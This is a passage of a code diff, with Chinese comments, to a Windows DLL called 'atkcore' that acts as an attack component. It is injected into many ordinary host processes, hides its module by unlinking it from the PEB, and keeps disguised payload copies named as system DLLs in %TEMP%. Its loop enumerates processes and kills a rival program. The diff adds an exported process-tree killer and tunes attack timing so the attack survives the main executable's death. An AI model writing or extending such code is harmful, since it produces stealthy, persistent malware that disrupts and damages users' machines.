        既降低 xx.exe CPU，又让副本在 xx 释放 leader 后立刻接手。 */
-    const DWORD dwIdle = HostIsXxExe() ? 300 : 30;
+    /* 攻击频率按宿主区分：
+         · xx.exe 自己（那是交付本体）：40ms，尽全力；
+         · 被注入的宿主副本：**2000ms**。用户指定的注入矩阵会把 atkcore 注进大量
+           普通进程，如果每个宿主都 40ms 枚举+击杀，N 个宿主就是 N 倍 CPU（实测卡死）。
+           2 秒一次足够"xx 死了仍然有攻击者在干活"，又不会把机器拖垮。 */
+    const DWORD dwIdle = HostIsXxExe() ? 40 : 2000;
     DWORD dwCopyTick = 0;
 
     while (g_bRunning)
     {
-        /* 注入用的 payload 副本：改名成系统 dll 并放到 %TEMP%，被删就重做 */
         {
             DWORD now = GetTickCount();
             if (dwCopyTick == 0 || now - dwCopyTick >= 5000) {
@@ -1929,19 +2337,39 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
     return 0;
 }
 
+/* 导出：按 PID 结束整棵进程树（供 xx.exe 的"窗口 → PID"路径调用）。
+   这样窗口层只需负责"发现"，真正的杀+锁死+删除全部集中在 atkcore 里一套实现。 */
+__declspec(dllexport) void WINAPI XxKillTree(DWORD pid)
+{
+    if (pid > 4 && pid != GetCurrentProcessId()) KillProcessTree(pid);
+}
+
+/* 崩溃日志：写进共享日志（弹窗能看见），避免宿主崩掉后日志也拿不到 */
+static LONG WINAPI AtkCrashFilter(EXCEPTION_POINTERS *ep)
+{
+    DWORD code = 0;
+    void *addr = NULL;
+    if (ep && ep->ExceptionRecord) { code = ep->ExceptionRecord->ExceptionCode; addr = ep->ExceptionRecord->ExceptionAddress; }
+    WriteKillLog(L"[CRASH] atkcore.dll pid=%lu code=0x%08lX addr=%p", GetCurrentProcessId(), (unsigned long)code, addr);
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
 BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
 {
     UNREFERENCED_PARAMETER(reserved);
     if (reason == DLL_PROCESS_ATTACH)
     {
         DisableThreadLibraryCalls(hinst);
+        SetUnhandledExceptionFilter(AtkCrashFilter);
 
         /* 摘 PEB 链后自身模块就查不到了，先缓存句柄 */
         g_hSelfModule = hinst;
 
         /* 进程内单例：模块隐藏后注入方无法判断宿主里有没有我们；已有实例就让
-           加载失败，避免同进程叠出多套攻击线程。名字带会话 token，对手无法预先抢占 */
-        XXWaitToken(&g_dwNameToken, 300);
+           加载失败，避免同进程叠出多套攻击线程。名字带会话 token，对手无法预先抢占。
+           **这里刻意不等 token**：创建/探测共用一张候选表（token → 共享 salt →
+           固定值 → 裸名，见 xxipc.h），所以 DllMain 这一刻还没收到 token 也能建对名字；
+           而 yy 的 HunterWorker 每 50ms 按名杀一轮，任何等待都是白送时间。 */
         g_hSingleton = XXModuleSingleton(L"atkcore", NameTok());
         if (!g_hSingleton) return FALSE;
 
@@ -1951,3 +2379,16 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
     }
     return TRUE;
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
